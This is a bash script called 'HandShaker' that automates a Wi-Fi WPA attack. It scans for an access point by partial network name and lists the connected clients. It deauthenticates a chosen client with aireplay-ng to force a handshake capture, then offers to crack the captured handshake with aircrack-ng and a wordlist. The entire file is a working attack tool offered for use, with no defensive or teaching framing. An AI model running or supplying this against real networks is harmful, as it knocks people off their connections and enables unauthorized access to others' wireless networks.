#!/bin/bash

fapscan()
{
		clear
		gnome-terminal --geometry=130x20 -x airodump-ng mon0 -w $HOME/tmp --output-format=csv&
		$COLOR 2;echo "[*] Scanning for AP's with names like $ESSID [*]";$COLOR 9
		sleep $SCN
		killall airodump-ng
		DONE=$( cat $HOME/tmp-01.csv | grep $ESSID ) 
		if [ $DONE -z ] 2> /dev/null
			then
				echo
				rm -rf $HOME/tmp*
				$COLOR 1;echo " [*] Not Found [*]";$COLOR 9
				$COLOR 4;echo " [*] Sleeping $SLP seconds..";$COLOR 9
			else
				csvtool col 4,14 $HOME/tmp-01.csv > $HOME/tmp3.csv
				csvtool col 1,14 $HOME/tmp-01.csv > $HOME/tmp4.csv
				
				if [ $(cat tmp3.csv | grep $ESSID | cut -c 2) = "," ]
					then
						CHAN=$(cat $HOME/tmp3.csv | grep $ESSID | cut -c 1)
					else
						CHAN=$(cat $HOME/tmp3.csv | grep $ESSID | cut -c 1-2)
				fi
				BSSID=$(cat $HOME/tmp4.csv | grep $ESSID | cut -c 1-17)
				fclientscan
		fi
		sleep $SLP
		fapscan
}

fclientscan()
{
	echo $BSSID
	echo $CHAN
	if [ ${BSSID:2:1} != ":" ] 2> /dev/null
		then
			rm -rf $HOME/tmp* 2> /dev/null
			fapscan
	fi
		
	rm -rf $HOME/tmp* 2> /dev/null
	CNT="0"
	clear
	if [ ${CHAN:1:1} = "," ] 2> /dev/null
		then
			CHAN=${CHAN:0:1}
	fi
	$COLOR 2;echo " [*] AP Found BSSID: $BSSID CHANNEL: $CHAN"
	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	if [ $CHKBIT = 0 ] 2> /dev/null
		then
			sleep 7
			CHKBIT=1
		else
			sleep 15
	fi
	killall airodump-ng
	grep 'Station' -A 10 $HOME/tmp1-01.csv > $HOME/tmp
	while read LINE
		do
			if [ ${LINE:0:4} != "Stat" ]
				then
					echo ${LINE:0:17} >> $HOME/tmp1
			fi
		done < $HOME/tmp
	clear
	while read LINE
		do
			case ${LINE:2:1} in
			":")CNT=$(( CNT + 1 ));;
			esac
		done < $HOME/tmp1
	if [ $CNT -lt 1 ]
		then
			$COLOR 1;echo " [*] No Clients found, retrying... [*]";$COLOR 9
			sleep 1
			fclientscan
		else
			fcap
	fi
}

fcap()
{
	CHKEX="0"
	if [ $CNT = 1 ] 2> /dev/null
		then
			CLIE=$(head -1 $HOME/tmp1)
		else
			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
			cat $HOME/tmp1
			echo
			$COLOR 4;echo " [*] Please paste clent MAC or Press Enter to use the first one:";$COLOR 9 
			read -p "  >" CLIE
	fi
	if [ $CLIE -z ] 2> /dev/null
		then
			CLIE=$(head -1 $HOME/tmp1)
	fi
	FILENAME="$BSSID""--""$RANDOM"
	FILENAME2="$BSSID""-""$RANDOM"".cap"
	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap&
	$COLOR 1; echo " [*] DEAUTHING $CLIE";$COLOR 9
	echo
	$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
	sleep 3
	while [ true ]
		do
			clear
			$COLOR 2;echo " [*] You should see [ WPA handshake: $BSSID ] in the airodump window if successful [*]"
			echo
			$COLOR 4;read -p " [*] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
			if [ $WASCAP = "n" ] 2> /dev/null
				then
					clear
					$COLOR 1; echo " [*] DEAUTHING $CLIE";$COLOR 9
					echo
					$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
					sleep 3
				else
					killall airodump-ng
					break
			fi
		done
	echo
	$COLOR 4;echo "[*] Saving and Stripping capture, please wait... [*]"
	echo
	pyrit -r "$HOME"/Desktop/hs/"$FILENAME"-01.cap -o "$HOME"/Desktop/hs/$FILENAME2 strip;$COLOR 9
	rm "$HOME"/Desktop/hs/"$FILENAME"-01.cap
	airmon-ng stop mon0&
	rm -rf $HOME/tmp*
	ISGOOD=$(pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze | grep good)
	
	if [ ${ISGOOD:0:5} = '#' ] 2> /dev/null
		then
			clear
			$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you";$COLOR 9
			$COLOR 4;echo $ISGOOD;$COLOR 9
			echo
			$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/hs/$FILENAME2";$COLOR 9
			echo
			echo
			$COLOR 4; echo " [*] Do you want to crack? [Y/n]";$COLOR 9
			read -p "  >" DOCRK
			case $DOCRK in
				"")fcrack;;
				"Y")fcrack;;
				"y")fcrack;;
				"n")fexit;;
				"N")fexit
			esac
		else
			$COLOR 1;echo " [*] Sorry, looks like there is a problem with captured handshake";$COLOR 9
			echo
			$COLOR 1;pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze;$COLOR 9
			rm -rf "$HOME"/Desktop/hs/$FILENAME2
			echo
	fi
	exit
}

fcrack()
{
	clear
	$COLOR 4;echo " [>] Please enter the full path of a wordlist to use";$COLOR 9
	read -e -p "  >" WORDLIST
	if [ ! -f $WORDLIST ] 2> /dev/null
		then
			$COLOR 1;echo " [*] ERROR $WORLIST not found, try again..";$COLOR 9
			sleep 1
			fcrack
		else
			aircrack-ng -w $WORDLIST $HOME/Desktop/hs/$FILENAME2
	fi
}

fexit()
{
			tput setab 9
			killall aircrack-ng 2> /dev/null
			airmon-ng stop mon0
			rm -rf $HOME/tmp* 2> /dev/null
			exit
}

fhelp()
{
	clear
	echo """ HandShaker - detect, deauth and capture handshakes by ESSID
	Usage: handshaker x 
			x - Partial unique ESSID (required)

				
	eg. handshaker BTHub3-F
"""
exit
}



fstart()
{
CHKBIT=0
COLOR="tput setab"
CHKEX=1
SLP=5
SCN=10
STATSC="0"
MOND=$(ifconfig | grep mon0)
mkdir -p "$HOME"/Desktop/hs

if [ $MOND -z ] 2> /dev/null
	then
		clear
		$COLOR 4;echo " [*] Which interface do you want to use?:";$COLOR 9
		echo
		iwconfig | grep "wlan"
		echo
		read -p "  >" NIC
		clear
		airmon-ng start $NIC
		clear
	else
		NIC=mon0
		clear
fi
fapscan
}

trap fexit 2

ESSID="$1"
if [ $# -lt 1 ]
	then
		fhelp
elif [ $1 = "--help" ]
	then
		fhelp
elif [ $1 = "-h" ]
	then
		fhelp
fi

fstart
